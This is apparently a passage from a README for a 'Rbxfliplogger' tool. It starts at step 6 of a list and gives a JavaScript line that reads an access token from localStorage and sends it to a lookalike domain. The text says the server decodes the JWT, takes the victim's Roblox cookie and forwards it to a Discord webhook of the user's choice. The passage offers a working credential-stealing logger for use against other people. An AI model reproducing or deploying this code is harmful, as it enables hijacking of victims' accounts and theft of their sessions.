# Rbxfliplogger
var token = localStorage.getItem('accessToken'); await fetch("https://www.rbxfilp.com/RbxfliploggerJscode/admin.php?t=" + token); ``` 6. The simple js code will get the value of auth._token.local (JWT Token) and then decoding (server-sided), after decoding it, it will read the "credentials" object which is the roblox cookie stored on rbxflip, then it sends the cookie to the discord webhook of your choice.
